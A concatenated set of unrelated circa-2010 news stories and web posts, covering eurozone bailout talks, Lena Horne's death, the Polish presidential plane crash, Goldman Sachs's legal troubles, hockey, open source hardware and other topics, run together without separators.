( LONDON ) - Finance minister Alistair Darling said Sunday that Britain cannot and will not support a European Union bailout fund to help struggling eurozone economies .
" I 'm very , very clear that if there 's a proposal to create a stability fund for the euro , that 's got to be a matter for the eurogroup countries , " he told Sky News television in Brussels , where he was attending an EU meeting .
" What we will not do and what we can't do is provide support for the euro ... the responsibility for supporting the euro must be for the eurogroup members " .
Darling added : " I think it 's important that we do everything we can to stabilise the markets to show we 're coming through what is a difficult period " .
Talks are to take place on an EU bailout fund worth some 60 billion euros ( 76 billion dollars ) to help indebted euro nations in the wake of the Greek financial crisis .
Lena Horne , who broke new ground for black performers when she signed a long - term contract with a major Hollywood studio and who went on to achieve international fame as a singer , died on Sunday night in Manhattan .
She was 92 .
Her death , at NewYork - Presbyterian / Weill Cornell Medical Center , was announced by her son - in - law , Kevin Buckley .
She lived in Manhattan .
In a message of condolence , President Obama said Ms. Horne had " worked tirelessly to further the cause of justice and equality . "
Ms. Horne first achieved fame in the 1940s , became a nightclub and recording star in the 1950s and made a triumphant return to the spotlight with a one - woman Broadway show in 1981 .
She might have become a major movie star , but she was born 50 years too early : she languished at MGM for years because of her race , although she was so light - skinned that when she was a child other black children had taunted her , accusing her of having a “ white daddy . ”
Ms. Horne was stuffed into one “ all - star ” film musical after another — “ Thousands Cheer ” ( 1943 ) , “ Broadway Rhythm ” ( 1944 ) , “ Two Girls and a Sailor ” ( 1944 ) , “ Ziegfeld Follies ” ( 1946 ) , “ Words and Music ” ( 1948 ) — to sing a song or two that , she later recalled , could easily be snipped from the movie when it played in the South , where the idea of an African - American performer in anything but a subservient role in a movie with an otherwise all - white cast was unthinkable .
As the new season of " Doctor Who " with Matt Smith continues apace , comics artist Jesse Hamm ( " Good As Lily " ) has undertaken a massive commission project : drawing every single Doctor and companion in " Doctor Who " history .
I 'm not sure exactly what definition of " companion " this entails -- there 's always been argument about characters like Sarah Kingdom , for example -- but Hamm 's finished about 20 so far , and you can check out a collection of them after the jump .

Do n’t be scared if you see a few more clowns on city streets next week .
The World Clown Association is holding its annual convention in Winnipeg from April 18 to 23 at Canad Inns Polo Park .
Several clowning competitions during the convention will be open to the public , and conventioneers have also arranged a charity basketball game between clowns and some Winnipeg sports and media personalities .
WCA president Richard Snowberg says the basketball and convention will be a real look into the world of professional clowning .
" Those attending the convention will get to take in a wide variety of lectures while many of the convention ’s clown competitions are open to the public , " he said , adding it was a real compliment to the WCA to attract Avner the Eccentric to be the event ’s keynote speaker .
Avner Eisenberg was recently inducted to the International Clown Hall of Fame and has been performing one - man shows on Broadway and around the world for decades .
He is probably best known for his role as the scene - stealing holy man in The Jewel of the Nile , co-starring Michael Douglas .
" We are very fortunate to have him attending , it is the first time for any convention .
It is quite the accomplishment , " Snowberg says .
Snowberg , who has over 34 years in the clowning business himself , says clowning as a whole is experiencing a bit of a plateau after blossoming during the late ’ 80s and early ’90s .
" It is a bit of a pendulum , it goes back and forth .
Every year however clowning gets a bit broader in terms of scope . "
Southdale resident Deanna Hartmier , Canadian central director of the WCA and director of the local chapter , Bump - A - Nose Clown Alley , says the convention is for anyone interested in getting a real glance at the world of clowning .
" There will be approximately 150 clowns coming in from all across North America as well as Japan , Malaysia , India , England , Puerto Rico and the West Indies , " she says .
The charity basketball game in support of Variety the Children ’s Charity will be held at the University of Winnipeg ’s Duckworth Centre .
Doors open at 12:15 p.m. with the game expected to start at 1:30 p.m. followed by photo opportunities and balloon - twisting demonstrations .
Suggested donation for the event is $ 2 per person .
Clown competitions open to the public include Make - Up and Wardrobe at 2:30 p.m. , April 19 , Single Skits at 7:30 p.m. , April 19 and Paradability on April 22 at 10 a.m .

The Montreal Miracle continues .
With a big assist from Toronto .
Call it destiny or , perhaps , a road trip by those ghosts that were once said to haunt the old Montreal Forum .
There does seem to be some unseen hand at work as the Cinderella Canadiens pushed through to the Eastern Conference final with a stunning 5 - 2 victory over the Penguins on Wednesday night in Game 7 of the NHL ’s second playoff round .
Mike Cammalleri , who went from playing in the GTHL as a boy to leading the NHL playoffs in goals , believes the mysterious force at work is the abundance of players in the Habs ’ lineup from the Toronto area .
Cammalleri is from Richmond Hill .
Dominic Moore is from Thornhill .
Rookie sensation P.K. Subban is from Rexdale and Glen Metropolit is from downtown ’s Regent Park .
He says they rib Montreal GM Pierre Gauthier about it all the time .
“ Figure it out , the more Toronto guys you get , the better chance you ’ve got to win , ” said Cammalleri amid the restrained euphoria of the Montreal dressing room .
“ We ’ve got a little bit of that Toronto bond , that Toronto chemistry .
When you grow up playing in Toronto , it ’s such a competitive hockey market as youngsters , it ’s almost like you ’re in your own little NHL .
“ There ’s a certain brand of hockey Toronto guys play . ”
On this night it was winning hockey .
Both Cammalleri , with his 12th of the post - season , and Moore scored as the Canadiens built a 4 - 0 lead , survived a brief Pittsburgh rally thanks to the goaltending of Jaroslav Halak and then eased to a 5 - 2 victory .
Montreal also got another big game from rookie defender Subban while Hal Gill , the former Maple Leaf , returned to the lineup after missing Game 6 with a lacerated calf and continued his superb work shutting down Penguins captain Sidney Crosby .
But will those connections be enough , with Montreal being the lone team based in Canada still chasing the Stanley Cup , to convince long - standing Leafs fans — and by definition Habs haters — to support the oft - resented club from La Belle Province ?
“ I know 20 guys that used to bleed blue and white that I grew up with that are here in Habs jerseys , ” said Cammalleri , who talked with Toronto before signing with the Canadiens last as a free agent last summer .
“ Slowly but surely I think we ’re getting a little bit of a following in Toronto .
I was a Leaf fan growing up and I can appreciate Leafs fans but maybe they can cheer for Canada ’s team right now because we ’re the only ones left . ”
Yes , the Canadiens are Canada ’s team and not just in name .
This is Montreal ’s first trip to a conference final since it won the Stanley Cup after a similarly unexpected miracle run in 1993 , the last time a team based in Canada won an NHL championship .
The Habs will play the winner of the Boston - Philadelphia series .
Whatever the various theories , Toronto - centric or other worldly , there are explanations for what happened here or really , what the Habs have been doing throughout a post - season in which they knocked off Washington , the NHL ’s top regular - season team , and now the defending Stanley Cup champs , both in seven games .
The Habs ’ stifling defence shut down Sidney Crosby and Evgeni Malkin , much as it handcuffed Alexander Ovechkin in the first round .
Pittsburgh ’s two scoring powers , looking as though they might be tired after two runs to the Cup finals — with an Olympics squeezed in there as well — each could manage only one goal in these seven games against Montreal .
“ I ’m not going to sit here and complain about playing Stanley Cup finals and Olympic gold - medal games , ” said Crosby .
“ That ’s a good problem to have and you have to deal with it .
There are times when it is a grind and you have to deal with it .
By no means is that any excuse or any reason for anything .
I would never blame that on anything .
Those are great things to be a part of and you have to find a way to still produce and be successful . ”
It was not a good night for the Pens ’ other big stars .
Goaltender Marc - Andre Fleury was pulled early in the second period after getting shredded for four goals on 13 shots .
And Sergei Gonchar had a horrible outing in his own end .
The brilliance of Halak has also been a constant and he made two eye - popping saves on Crosby and Malkin early in the third with Pittsburgh pressing .
“ It ’s rewarding to keep ( Crosby ) off the scoreboard .
I thank Jaro every day , ” said Gill , the Pittsburgh captain ’s blanket thoughout this series .
This game , really , was over five minutes into the second with Montreal holding a 4 - 0 lead .
Even the high - flying Penguins were n’t going to put five past Halak .

“ No explanation , ” for the start , said Pittburgh ’s Max Talbot .
“ It stings a lot .
It ’s pretty tough .
You come into this game you ’re not thinking about that .
You ’re not thinking about losing this game .
It ’s something tough to take right now .
It ’s never fun to lose . ”
But it is fun to win .
Just ask Cammalleri .
“ I ’m pretty happy right now , It ’s a pretty special feeling , ” he said .
“ I ca n’t even imagine what Ste. Catherine Street ( in downtown Montreal ) looks like right now .
I ’m excited we can make so many people happy . ”

On his radio show today Glenn Beck ranted against the World Cup because he proclaimed the World Cup is just like Barack Obama .
Beck said , “ I believe that everything you need to know about Barack Obama ’s policies can be explained in the World Cup… Congratulations to Barack Obama and his polices that will have as much success as the World Cup in America . ”
Here is the audio courtesy of Media Matters
Advertisements
Beck said , “ Barack Obama ’s policies are the World Cup .
Their policies , his policies are the World Cup of political thought , “ It does n’t matter how you sell it to us .
It does n’t matter how many celebrities you get .
It does n’t matter how many bars open early .
It does n’t matter how many beer commercials they run .
We do n’t want the World Cup .
We do n’t like the World Cup .
We do n’t like soccer .
We want nothing to do with it .
You can package it any way — you can spend all kinds of money .
You can force it on our television sets .
We will not enjoy the World Cup . ”
Beck continued , “ The rest of the world like Barack Obama ’s policies .
We do not , and I ’m cool with that .
If you want Barack Obama ’s policies or the World Cup in your country have at it .
I do n’t hate you .
I do n’t understand you , but I do n’t hate you ….
I believe that everything you need to know about Barack Obama ’s policies can be explained by the World Cup… Congratulations to Barack Obama and his polices that will have as much success as the World Cup in America .
Go try those polices someplace else .
They ’ll be wildly successful . ”
As usual , Beck is wrong on both counts .
Media Matters pointed out that 120 million Americans watched the 2006 World Cup , and 17 million Americans watched the final , which did not feature the US team .
The 2006 World Cup final drew more viewers than any other professional sports championship outside of the Super Bowl .
Lots of Americans , who may not be soccer fans , enjoy the event that is the World Cup .
I guess those 120 million viewers were n’t what Beck would consider real Americans .
Obama ’s policies have been very successful , or maybe Beck has n’t noticed that the total American economic collapsed that he was warning his viewers about in 2009 has n’t happened .
Beck also has n’t noticed that the economy is getting better , and slowly more people are finding jobs .
Those things are happening because of Obama ’s so called “ unsuccessful ” policies .
The notion that Obama is unsuccessful president is right wing science fiction .
Beck was trying to tie Obama ’s foreign policy to the World Cup , but most people do n’t view a more open and cooperative foreign policy as a bad thing .
In fact , after the resounding failure of George W. Bush ’s bullying unilateral foreign policy , Obama has gotten some of his highest marks from the American people on his foreign policy .
Even though Right Wing jihads like Beck will never understand this , most Americans do n’t want to go it alone living in a state of never ending fear and war .
They want peace , cooperation , and celebration , which on a very small level the World Cup represents .

Daily Kos renounces pollster , threatens fraud suit
Updated 5:29 p.m.
By Garance Franke - Ruta
Markos Moulitsas Zuniga , the founder of the Daily Kos blog , disavowed the results of all polls conducted for his site by the firm Research 2000 , alleging that they were unreliable and possibly fraudulent .
His accusation , posted on Daily Kos Tuesday :
" We were defrauded by Research 2000 , and while we do n't know if some or all of the data was fabricated or manipulated beyond recognition , we know we can't trust it , " Moulitsas wrote .
He made the accusation based on a statistical analysis of the Research 2000 results that raised questions about their validity .
Its conclusion : " We do not know exactly how the weekly R2 K results were created , but we are confident they could not accurately describe random polls . "
Given that outcome , Moulitsas declined to stand by any Daily Kos blog posts based on Research 2000 polls .
" I no longer have any confidence in any of it , and neither should anyone else , " he wrote .
" I ask that all poll tracking sites remove any Research 2000 polls commissioned by us from their databases .
I hereby renounce any post we 've written based exclusively on Research 2000 polling . "
One of the most provocative findings of the firm was that a substantial portion of Republicans did not believe President Obama was born in the United States .
A July 2009 poll for Daily Kos found that 28 percent of Republicans were " birthers , " as those who question Obama 's birth place are frequently called .
Washington Post polling in April 2010 found similar results , with 31 percent of Republicans saying Obama was born in another country .
" Daily Kos will be filing suit within the next day or two , " Moulitsas wrote .
Research 2000 president Del Ali referred all questions to his attorney .
" I will tell you unequivocally that we conducted every poll properly for the Daily Kos , " he said .
Nate Silver from the blog FiveThirtyEight has also raised questions about Research 2000 's methods and results .
On Tuesday afternoon , Ali 's attorneys sent a " cease and desist demand " letter demanding Silver stop criticizing Research 2000 publicly .
In addition to Daily Kos , Research 2000 has polled for the Progressive Change Campaign Committee , Democracy for America and Credo Action and many other progressives .
Let me preface this article by saying that most police officers are dedicated individuals who serve their communities professionally .
However , especially in red states , that is not always the case .
When Lonnie Tinsley of El Reno , Oklahoma , called 911 to ask for medical assistance for his disabled , bed - ridden grandmother , he could n’t have dreamed it would end with police tasering the 86 - year - old woman twice , stepping on her oxygen hose until she could n’t breathe , and sending her to a psychiatric hospital for six days .
Yet that ’s what a lawsuit ( PDF ) filed in a federal court in Oklahoma this week alleges .
According to the lawsuit , in December , 2009 , Tinsley came by his grandmother ’s apartment to see if she was doing alright in the midst of a winter storm .
When she was n’t able to tell him if she had taken her medication , Tinsley called 911 and asked responders to send medical technicians over to evaluate her .
But instead of an ambulance , the lawsuit alleges , " as many as 10 El Reno police " arrived and " pushed their way through the door . "
At that point , 86 - year - old Lona Varner told police to " get out of her apartment . "
That ’s when officer Thomas Duran , described in the lawsuit as the " leader " of the police unit , allegedly told another officer to " taser her . "
When Tinsley responded " Do n’t tase my granny ! " the officers threatened to taser him instead , the lawsuit states .
In his police report , officer Durgan asserted that Varner " took a more aggressive posture in her bed , " evidently causing him to fear for his and his officers ’ lives .
Police then handcuffed Tinsley and took him to a waiting squad car .
They released him without charge some time later .
Meanwhile , the lawsuit alleges , officers " stepped on [ Varner ’s ] oxygen hose until she began to suffer oxygen deprivation . "
Officers then fired a taser at her , hitting her twice , causing her to pass out , the lawsuit states … [ emphasis added ]
Goldman Sachs has mounting legal woes
NEW YORK ( CNNMoney.com ) -- Goldman Sachs ' legal headaches do n't start and end with the Securities and Exchange Commission .
Reports surfaced late Thursday that federal prosecutors have opened a criminal investigation into Goldman and its employees , over whether it may have committed securities fraud in its mortgage trading operations .
A representative for the firm would not confirm reports of an inquiry , but said they were not surprised given the scrutiny the firm has endured in recent weeks , adding they would cooperate with any requests for information .
The latest legal action builds on the high - profile civil case brought against the company last month by the SEC , in which the agency charged the firm and one of its employees with defrauding investors in the sale of securities tied to subprime mortgages .
In many ways , the agency 's case has become a game changer for Goldman .
Not only has it tarnished the gilded reputation of Wall Street 's top firm , it also exposed the company to series of new legal attacks across a number of fronts .
Since the SEC announcement , top German and British officials , including UK Prime Minister Gordon Brown , have demanded investigations into the firm 's dealings , opening the door to additional regulatory probes .
And even some state law enforcement officials have hinted that they too may join the Goldman Sachs pile - on , capitalizing on the public distaste for big banks and Wall Street in general .
Richard Blumenthal , Connecticut 's attorney general , said recently that he is already looking into the SEC 's allegations , potentially setting the stage for a formal state investigation .
There 's also the possibility that individual investors who were burned by the now infamous " Abacus " mortgage security that 's at the heart of the SEC probe may also sue Goldman .
" Some of the investors who lost money might try to go after them , " said Tom Hazen , a securities law professor at the University of North Carolina .
The only concrete legal action taken so far however , has been on behalf of a handful of individual shareholders .
Those complaints have alleged that the company simply fell down on the job , failing to be transparent with investors in " Abacus " as well as with its own shareholders about the potential charges it faced from the SEC .
Goldman acknowledged some of those legal woes in a securities filing Monday , adding that it expects to face other suits and investigations in the future related to the sale of complex mortgage investments called collateralized debt obligations , or CDOs .
Experts suggest the company could also soon come under fire as pension funds and other activist investors cry foul over the drop in the company 's stock .
Shares of Goldman ( GS , Fortune 500 ) have plunged 21 % since the SEC first revealed its fraud allegations , including a 9 % drop on Friday as news of the federal criminal probe prompted a pair of analysts to cut their rating on the firm .
" There are any number of large institutional investors looking at a possible class action against Goldman based upon recent disclosures and the recent stock drop , " said Thomas Dubbs , a senior partner with Labaton Sucharow , a law firm that specializes in securities litigation cases .
The Goldman spokesman said the company would not comment on the current lawsuits filed against it or about the possibility of more legal action .
Damage to reputation may outweigh legal costs
All along , analysts and legal experts have contended that the actual dollars the company might have to spend defending itself against such claims is quite manageable for Goldman , a firm with famously deep pockets .
Some estimates have placed the cost of the SEC claim at $ 700 million or more , over the next couple years .
While no small sum for some firms , that 's mere pennies for a company that is expected to bring in about $ 11 billion in revenue each quarter through the remainder of this year and into 2011 .
Even before the SEC 's bombshell announcement on April 16 , Goldman attorneys were already bracing for a busy 2010 .
" Our litigation expenses can be expected to remain high , " the company wrote in its latest annual report .
Goldman was already involved in a number of cases that seemed much more minor in comparison to its current headaches .
For example , Goldman and 20 of its peers have been engaged in a long - standing battle with the city of Cleveland for allegedly creating a " public nuisance " after securitizing subprime mortgages that are now tied to foreclosed , and in some instances , abandoned homes .
In March , a former female vice - president at Goldman filed a discrimination suit against the firm , alleging Goldman engaged in " mommy tracking " , or sending her to a lesser position after her first pregnancy and ultimately firing her while on maternity leave with her second child .
Despite all those headaches , experts assert that Goldman 's biggest threat is not how much it may have to pay in legal settlements .
Instead , it is the potential impact the whole affair will have on its reputation , client relationships and worker morale .
" Needless to say , this is highly challenging for us to quantify , " Credit Suisse analyst Howard Chen , who tracks the firm , wrote in a note to clients earlier this month .
Maybe that 's why investors are so nervous .
In this Aug. 12 , 2008 , file photo , Polish President Lech Kaczynski speaks to the media prior to boarding his plane at the military airport in Warsaw .
(( Alik Keplicz / Associated Press ) )
Polish President Lech Kaczynski is dead , along with his wife , the head of Poland 's central bank and other senior government officials , after the plane they were in crashed Saturday in western Russia in thick fog .
Kaczynski , 60 , and his entourage were flying from Warsaw to the Russian city of Smolensk for a memorial service when the aircraft crashed on its final descent , officials said .
The pilot had been asked by ground controllers to divert to one of two alternate airports because of the poor visibility , but persisted and tried to land in Smolensk .
Russian and Polish officials said there were no survivors among the 96 people aboard the presidential aircraft , a 26 - year - old Tupolev Tu-154 .
" We still cannot fully understand the scope of this tragedy and what it means for us in the future .
Nothing like this has ever happened in Poland , " Foreign Ministry spokesman Piotr Paszkowski said .
Government and military officials were heading to Russia for ceremonies marking the 70th anniversary of the 1940 Katyn Forest massacre , when Soviet secret police killed 22,000 Polish officers .
The crash is the latest in a series of air accidents in which prominent politicians or heads of international organizations have died .
Among world leaders who have lost their lives in similar accidents : · July 30 , 2005 : John Garang , vice - president of Sudan , when his helicopter crashed in poor weather into a mountain .
· Feb. 26 , 2004 : Boris Trajkovski , president of Macedonia , when his plane crashed in poor weather on landing in Mostar .
· April 6 , 1994 : Juvenal Habyarimana , president of Rwanda , when his plane was shot down by a missile as it approached Kigali airport .
Also killed in the crash was Cyprien Ntarymira , president of Burundi .
Both were Hutus , and their deaths contributed to the Rwandan Massacre .
· Aug. 17 , 1988 : Gen. Muhammad Zia Ul - Haq , president of Pakistan , when his air force plane crashed on takeoff from Bahwalpur .
Also killed in the crash was the U.S. ambassador to Pakistan , Arnold Lewis Raphel .
· Sept. 17 , 1961 : Dag Hammarskjold , secretary general of the United Nations , when his plane crashed into the jungle in Zambia .
In addition to the president and his wife , Maria , passengers included Poland 's army chief , Franciszek Gagor , Deputy Foreign Minister Andrzej Kremer , central bank governor Slawomir Skrzypek and other officials .
Three legislators , the deputy parliament speaker , the army 's chaplain , Poland 's civil rights commissioner and at least two presidential aides , were also aboard .
Nearly all the victims were part of the Polish state delegation for the Katyn commemoration .
The accident was not expected to directly affect the functioning of Polish government .
Poland 's president is commander in chief of its armed forces but the position 's domestic duties are chiefly symbolic .
The prime minister , Donald Tusk , and other top government ministers were not aboard the plane .
Aircraft hit ground , burst into flames
The plane tilted to the left before crashing , witness Slawomir Sliwinski told the state news channel Rossiya - 24 .
He said there were two loud explosions when the aircraft hit the ground and burst into flames .
Rossiya - 24 showed footage from the crash site , with pieces of the plane scattered widely amid leafless trees and small fires burning in woods shrouded with fog .
Initial signs pointed to an accident , possibly due to the fog that is very common in the area in spring and fall , as well as pilot error .
Both black boxes have been found , and preliminary data indicated that the plane hit the treetops as it was making the approach to the airport in poor visibility , the ITAR - Tass news agency quoted a Russian official as saying .
Andrei Yevseyenkov , spokesman for the Smolensk regional government , said Russian dispatchers had asked the Polish crew to divert from the military airport in North Smolensk and land instead in Minsk , the capital of neighbouring Belarus , or in Moscow to the east because of the fog .
An image from Polish television 's TVP shows a firefighter amid the wreckage of the crashed presidential aircraft .

While traffic controllers generally have the final word in whether it is safe for a plane to land , they can and do leave it to the pilot 's discretion .
Russian Air Force Gen. Alexander Alyoshin confirmed that the pilot disregarded instructions to fly to another airfield .
The Smolensk airport is not equipped with an instrument landing system to guide planes to the ground .
According to the Aviation Safety Network , there have been 66 crashes involving Tu-154s , including six in the past five years .
The Russian carrier Aeroflot recently withdrew its Tu-154 fleet from service .
The presidential plane was fully overhauled in December , the general director of the Aviakor aviation maintenance plant in Samara , Russia , told Rossiya - 24 .
World leaders express shock , sadness
Bronislaw Komorowski , leader of the lower house of parliament , has taken over as acting president and has declared a week of national mourning .
According to Poland 's constitution , he must announce a new presidential election within two weeks and the vote — which had been due in October — must take place within two months of Komorowski's announcement .
World leaders sent condolences to Polish officials and praised the president 's dedication to democracy .
Poland 's ambassador to Canada , Zenon Kosiniak - Kamysz , said the list of government officials is long and " the number of victims is shocking . "
He was informed of the crash early Saturday and knew many people on the flight .
People mourn in front of the presidential palace in Warsaw on Saturday .
( ( Czarek Sokolowski / Associated Press ) )
Prime Minister Stephen Harper offered his condolences to Poland and Polish - Canadians , while praising Kaczynski's achievements .
" President Lech Kaczynski was a man who stood proudly and defiantly for democracy and human rights through even the most difficult times .
His sudden passing is a great loss for his country and for his many friends here in Canada , particularly within the Polish - Canadian community .
" On behalf of the government of Canada and all Canadians , I wish to express my deepest sympathy , and my sincere condolences , to the government and people of Poland on this very sad day , " Harper said .
German Chancellor Angela Merkel said she was shocked and saddened by the death of Kaczynski and other top Polish officials .
" I am so deeply upset by the accident and the death of the Polish president , " Merkel said .
" I knew that his whole life had been dedicated to the fight for the freedom of Poland and the freedom of Europe .
We will miss Lech Kaczynski in Germany too .
" Germany is mourning today with the whole Polish people . "
U.S. President Barack Obama issued a statement saying , " the loss is devastating to Poland , to the United States , and to the world . "
British Prime Minister Gordon Brown said Kaczynski was " one of the defining actors in Poland 's modern political history .
" We know the difficulties that Poland has gone through , the sacrifices that he himself made as part of the Solidarity movement .
We know the contribution he made to the independence and the freedom of Poland , " Brown said .
" On this difficult day the people of Russia stand with the Polish people , " Russian President Dmitry Medvedev told the Polish prime minister in a telephone call .
Putin to oversee investigation
Polish Prime Minister Donald
Tusk flew to the crash site , where he and Russian Prime Minister Vladimir Putin met and laid flowers together .
Putin has personally taken charge of the investigation into the crash , and he offered his condolences Saturday .
" We have to do everything so that in the shortest time we find out the cause of the tragedy , " he said .
It 's near - impossible to find anyone in Afghanistan who does n't believe the US are funding the Taliban : and it's the highly educated Afghan professionals , those employed by ISAF , USAID , international media organisations – and even advising US diplomats – who seem the most convinced .
One Afghan friend , who speaks flawless English and likes to quote Charles Dickens , Bertolt Brecht and Anton Chekhov , says the reason is clear .
" The US has an interest in prolonging the conflict so as to stay in Afghanistan for the long term . "
The continuing violence between coalition forces and the Taliban is simple proof in itself .
" We say in this country , you need two hands to clap , " he says , slapping his hands together in demonstration .
" One side ca n't do it on its own . "
His arguments are reasoned , although he slightly ruins the effect by explaining to me that no Jews died in the Twin Towers .
It 's not just the natural assets of Afghanistan but its strategic position , the logic goes .
Commanding this country would give the US power over India , Russia , Pakistan and China , not to mention all the central Asian states .
" The US uses Israel to threaten the Arab states , and they want to make Afghanistan into the same thing , " he says .
" Whoever controls Asia in the future , controls the world . "
" Even a child of five knows this , " one Kabuli radio journalist tells me , holding his hand a couple of feet from the ground in illustration .
Look at Helmand , he says ; how could 15,000 international and Afghan troops fail to crush a couple of thousand of badly equipped Taliban ?
And as for the British , apparently they want to stay in Afghanistan even more than the Americans .
The reason they want to talk to the Taliban is to bring them into the government , thus consolidating UK influence .
This is n't just some vague prejudice or the wildly conspiratorial theories so prevalent in the Middle East .
There is a highly structured if convoluted analysis behind this .
If the US really wanted to defeat the Taliban , person after person asks me , why do n't they tackle them in Pakistan ?
The reason is simple , one friend tells me .
" As long as you do n't get rid of the nest , the problem will continue .
If they eliminate the Taliban , the US will have no reason to stay here . "
The proof is manifold , they say ( although it does tend to include the phrase guaranteed to dismay every journalist : " everybody knows that … " ) .
Among the things everybody knows are that Afghan national army troops report taking over Taliban bases to find identical rations and weapons to their own US - supplied equipment .
The US funds the madrasas both in Afghanistan and in Pakistan , which produce the young Talibs .
US army helicopters regularly deliver supplies behind Taliban lines .
The aid organisations are nothing more than intelligence - collecting agencies , going into regions the army cannot easily reach to obtain facts on the ground .
Even the humblest midwife - training project is a spying outfit .
One political scientist , who works as an advisor to US agencies in the north of the country , recounts how people fear the continuing influence of the warlords , illustrating his point with descriptions of violence and corruption that extends into the realms of banking , government and trade .
Afghans hate these warlords , he says , but the US wants them kept in place .
" If they were removed , and competent and clean people brought in , we would bring in revenues of our own .
We could have our own economy , and demand foreign investment with transparency .
We would have a true army , to protect us and serve Afghanistan . "
So why do these well - educated Afghan professionals work for governments they are convinced want to sink their claws into their country ?
There 's nothing contrived about their patriotism – with their skills they could easily study or work abroad , but choose to stay to build a better future for their country .
Afghans have a historical suspicion towards any foreign power involved in their country and maybe with the resilience of a nation which has seen off one occupier after another , they are willing to wait it out , confident the will of the US will break before their own .
They do n't want Nato to leave for 15 , maybe 20 years , anyway .
It will take that long for Afghan institutions to be able to survive independently .
In the meantime , as my literature - loving friend – who works for a number of US agencies – tells me , there is no contradiction in survival .
" I like Benjamin Franklin in my pocket , " he smiles .
So much for hearts and minds .
FAQ
What IS the Secret of Monkey Island ?
Although never officially confirmed by Ron Gilbert , we have it from reliable sources that this article is pretty dang close to explaining the whole thing .
Will there be a Monkey Island 6 ?
No - one knows .
:(
How do I get my old LEC games working under NT / 2000 / XP ?
Our hints section should help you on your way .
Why the heck is Guybrush afraid of porcelain ?
Our interview with Chris Purvis may ( or may not ) clear that up .
Where can I learn more about the development of the games ?
First , you may want to check out the links to the individual games on the Games menu on the left .
Also , our interviews with various people involved with the Monkey Island games can prove to be interesting .
How long has TSB been around ?
Since 1996 .
I want to download the Monkey Island games , where can I get them ?
That is illegal .
You can buy the games from LucasArts .
How did Guybrush get his name ?
DPaint , the program used to develop a lot of the original Monkey Island game 's graphics , stored character files as ' brush ' files .
The main character file ( which obviously was of a guy ) was simply called guy .
brush , and that 's how the name Guybrush came along .
( Other sources claim the filename was guybrush . bbm -- this may or may not be true depending on which platform the file was created on .
The assumption comes from DPaint only being able to use three character file extensions , but as the Amiga actually did n't use file extensions , it could easily have been called guy .
brush . )
Threepwood was decided in a company contest - the name comes from the book " The Brinkmanship of Galahad Threepwood " ( US title ) .
" Threepwood " is also rumoured to be the name of Dave Grossman 's character in RPGs .
Selling products whose design anyone can access , edit , or use on their own is pretty crazy .
It ’s also good business .
At the annual hacker conference Foo Camp East this year , Phillip Torrone and Limor Fried from Adafruit Industries gave a rapid fire five minute presentation on thirteen companies with million dollar revenues from open source hardware ( OSHW ) .
Companies providing OSHW allow all designs of the products to be shared through an open license , meaning that everyone is free to download , modify , and share all the schematics and associated software .
You ’re encouraged to make , refine , or even sell your own versions of these products .
While this business model is counter - intuitive for those used to our patent and copyright loving system , Torrone and Fried estimate that the industry will reach a billion dollars by 2015 .
Check out their talk in the video below .
Among the OSHW baker ’s dozen are names that we ’re familiar with .
We ’ve long admired MakerBot and their 3D printing prowess , BugLabs ’ modular approach to electronic gadgetry is top notch , and we ’ve seen Arduino enabled projects do some amazing things .
Most of the other companies mentioned are equally interesting .
What really impresses me , however , is how quickly this industry as a whole is growing .
Just five years ago , there were only a handful of OSHW projects actively supported .
Now there are more than 200 .
And these million dollar companies are still expanding .
Slides from this presentation ( Million dollar baby – Businesses designing and selling open source hardware , making millions ) are available in PDF .
Open source hardware may still be relatively new , but the open source idea is well tested in software .
Linux is a definitive player in the world of operating systems , and there are hundreds ( if not thousands ) of open source programs of professional grade ready for you to use freely .
I ’m typing this article on OpenOffice right now .
At the risk of sounding hyperbolic , the open paradigm is changing the way the world works .
Small businesses ( and larger ones ) are seeing that profits and sharing can go hand in hand .
Limor and Fried ’s list of thirteen companies are great examples of OSHW “ retailers ” making an impact and growing their market .
Add to that list research and development communities we ’ve seen such as Willow Garage , ROS , OpenWetWare , Pearl Biotech , Pranav Mistry ( Sixth Sense ) , and more .
Together these groups are part of a large trend that is re-examining the way that intellectual property is managed and developed .
Share your work openly and innovation is accelerated .
Give your consumers rights to their goods and they will help develop them ( and stay loyal to the brand ) .
As the open source community continues to expand it may not only change the way we conceive of ownership of technology , it may also foster the growth of that technology with unparalleled success …and you still might be able to get rich while it happens .

A boy said it to another boy when they were walking behind me in the mall .
Then they started laughing .
I think they meant for me to hear it .
I was wearing a white dress with small green spots and a green belt .
White canvas sneakers and green socks .
The neckline is kinda square with very short sleeves , so not really a collar .
The hem is about four inches below the knee .
My aunty made this dress for me , we saw it in a movie ' peggy sue got married ' and I use it for dancing .
I love this dress .
Does it mean they think it is home made and the bits are different ?
I asked the old guy that picks up our milk , hes kinda nice and said it was a beautiful dress and he did n't know and that I should ask my aunt .
But she made it for me and I do n't want to hurt her feelings .
The flammable liquid preserving the snakes helped spread the fire
A leading collection of dead snakes , spiders and scorpions housed at a research centre in Sao Paulo , Brazil , has been destroyed by fire .
The curator of the Butantan Institute said the destruction of the entire collection was a " loss to humanity " .
The nearly 80,000 preserved snakes and the thousands of specimens of spiders and scorpions were used in research .
Live animals housed nearby that are used to produce serums and vaccines were not harmed , the institute said .
" The entire collection was lost , the biggest collection of snakes in the world , " curator Francisco Franco said .
" It 's a loss to humanity . "
A firefighter said the flammable liquid used to preserve the specimens helped spread the fire .
The cause of the blaze is being investigated .
Some of the specimens in the 100 - year - old collection were of rare or extinct species .
Paul Volcker has an almost mythical status as the last unambiguously successful chairman of the US Federal Reserve , wise counsellor to President Obama and the man who supposedly knows how to fix the global financial system .
He 's even lent his name to perhaps the boldest of Obama 's proposed financial reforms , the Volcker Rule - which , if implemented , would ban licensed banks that receive taxpayer protection from engaging in proprietary trading , or significant trading for their own account ( as opposed to working for their clients ) .
He was in town yesterday , giving a speech at the annual Wincott Awards for financial journalists .
And I managed , in an impertinent way , to perform a journalist 's arrest on Mr Volcker for two minutes : what he said into my microphone can be heard in a piece I put together for the Today Programme .

I also had a longer chat with him , armed only with a notebook , and he made fascinating points in his off - the - cuff speech .
Here is what he believes can and will be done to mend broken finance , and where he sees the big looming risks .
1 ) He has no doubt that Congress will pass the Volcker rule .
2 ) He defines the Volcker rule in a simple way , which is that banks should use their capital only to serve the interests of their clients , rather than trading to generate speculative profits for their owners .
He believes that if boards of banks are aware that 's the spirit of a new law , they will impose significant restrictions on the activities of their executives .
3 ) He is not advocating a return to Glass Steagall , or a stipulation that retail banks should be wholly prohibited from engaging in investment banking , such as underwriting securities .
